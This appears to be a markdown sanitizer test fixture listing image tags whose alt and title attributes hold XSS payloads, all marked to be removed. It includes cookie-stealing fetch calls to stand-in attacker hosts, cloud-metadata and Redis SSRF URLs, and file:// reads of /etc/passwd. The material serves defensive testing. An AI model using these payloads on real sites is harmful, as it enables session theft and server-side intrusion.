# Attribute Injection Bypasses - Testing Complete Attribute Removal

## JavaScript in title attributes (should be completely removed)
![safe](https://evil.com/image.jpg "javascript:alert(document.domain)")
![safe](https://attacker.com/evil.jpg "javascript:alert(window.location)")  
![safe](https://malicious.com/payload.jpg "javascript:eval(atob(YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ))")
![safe](https://evil.com/steal.jpg "javascript:fetch(//attacker.com)")

## Data URIs in title attributes (should be completely removed)
![safe](https://evil.com/image.jpg "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg")
![safe](https://attacker.com/evil.jpg "data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ")
![safe](https://malicious.com/payload.jpg "data:application/javascript,alert(1)")

## Event handlers in alt attributes (should be completely removed)
![javascript:alert(document.cookie)](https://evil.com/steal-cookies.jpg)
![onload:alert(document.domain)](https://attacker.com/domain-leak.jpg)
![onclick:fetch(//attacker.com)](https://evil.com/click-track.jpg)
![onerror:eval(atob(payload))](https://malicious.com/eval-payload.jpg)

## Unicode script characters in attributes (should be completely removed)
![𝒿𝒶𝓋𝒶𝓈𝒸𝓇𝒾𝓅𝓉:𝒶𝓁𝑒𝓇𝓉(𝒹𝑜𝒸𝓊𝓂𝑒𝓃𝓉.𝒹𝑜𝓂𝒶𝒾𝓃)](https://evil.com/image.jpg "𝒿𝒶𝓋𝒶𝓈𝒸𝓇𝒾𝓅𝓉:𝒶𝓁𝑒𝓇𝓉(𝒹𝑜𝒸𝓊𝓂𝑒𝓃𝓉.𝒹𝑜𝓂𝒶𝒾𝓃)")
![𝓳𝓪𝓿𝓪𝓼𝓬𝓻𝓲𝓹𝓽:𝓮𝓿𝓪𝓵(𝓪𝓽𝓸𝓫(𝓹𝓪𝔂𝓵𝓸𝓪𝓭))](https://evil.com/image.jpg)

## Backticks in title for template literals (should be completely removed)
![safe](https://evil.com/image.jpg "`${alert(1)}`")
![safe](https://evil.com/image.jpg "`${document.domain}`")
![safe](https://evil.com/image.jpg "`${fetch(//evil.com)}`")
![safe](https://evil.com/image.jpg "`${eval(payload)}`")

## Control characters that should be completely removed
![javascript\x00:alert(1)](https://evil.com/image.jpg "javascript\x00:alert(1)")
![javascript\x09:alert(1)](https://evil.com/image.jpg "javascript\x09:alert(1)")
![javascript\x0A:alert(1)](https://evil.com/image.jpg "javascript\x0A:alert(1)")
![javascript\x0D:alert(1)](https://evil.com/image.jpg "javascript\x0D:alert(1)")

## Mixed dangerous content (should be completely removed)
![<script>alert(xss)</script>](https://evil.com/image.jpg "<script>alert(title-xss)</script>")
![onclick=alert(1) onerror=fetch(evil)](https://evil.com/image.jpg "onload=alert(2) src=javascript:alert(3)")
![&lt;img src=x onerror=alert(4)&gt;](https://evil.com/image.jpg "&lt;iframe src=javascript:alert(5)&gt;")

## Various protocols in attributes (should be completely removed)
![ftp://attacker.com/payload](https://evil.com/image.jpg "ftp://attacker.com/payload")
![mailto:victim@evil.com](https://evil.com/image.jpg "mailto:victim@evil.com")
![tel:+1234567890](https://evil.com/image.jpg "tel:+1234567890")
![stun:attacker.com:3478](https://evil.com/image.jpg "stun:attacker.com:3478")

## Base64 encoded payloads (should be completely removed)
![base64:PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg](https://evil.com/image.jpg "javascript:eval(atob(PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg))")
![payload](https://evil.com/image.jpg "data:text/html,base64:PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg")

## Network exfiltration attempts (should be completely removed)
![safe](https://evil.com/image.jpg "http://localhost:8080/admin")
![safe](https://evil.com/image.jpg "http://169.254.169.254/metadata")
![safe](https://evil.com/image.jpg "gopher://127.0.0.1:6379/_info")

## Mixed character set exploitation (should be completely removed)
![javascript:alert(привет)](https://evil.com/image.jpg "javascript:alert(こんにちは)")
![javascript:alert(🚨payload🚨)](https://evil.com/image.jpg "javascript:alert(💀danger💀)")
![javascript:alert(אלרט)](https://evil.com/image.jpg "javascript:alert(تنبيه)")

## File system access attempts (should be completely removed)
![safe](https://evil.com/image.jpg "file:///etc/passwd")
![safe](https://evil.com/image.jpg "file:///proc/self/environ")
![safe](https://evil.com/image.jpg "file:///windows/system32/drivers/etc/hosts")

## Alternative quote characters (should be completely removed)
![safe](https://evil.com/image.jpg "javascript:alert(‚payload‛)")
![safe](https://evil.com/image.jpg "javascript:alert(„payload")")
![safe](https://evil.com/image.jpg "javascript:alert(‹payload›)")
![safe](https://evil.com/image.jpg "javascript:alert(«payload»)")

## Complex function calls (should be completely removed)
![alert(document.domain)](https://evil.com/image.jpg "fetch(//attacker.com/steal?data=document.cookie)")
![eval(atob(payload))](https://evil.com/image.jpg "setTimeout(alert,100)")
![Function(payload)()](https://evil.com/image.jpg "setInterval(leak,1000)")

## Semicolon-separated payloads (should be completely removed)
![payload1;payload2](https://evil.com/image.jpg "javascript:alert(1);fetch(//evil.com)")
![safe](https://evil.com/image.jpg "data:text/html,payload1;payload2")
![safe](https://evil.com/image.jpg "javascript:void(0);alert(document.domain)")

## Protocol handlers and custom schemes (should be completely removed)
![safe](https://evil.com/image.jpg "intent://payload")
![safe](https://evil.com/image.jpg "itms://payload")
![safe](https://evil.com/image.jpg "market://payload")
![safe](https://evil.com/image.jpg "app://payload")
![safe](https://evil.com/image.jpg "custom-protocol://payload")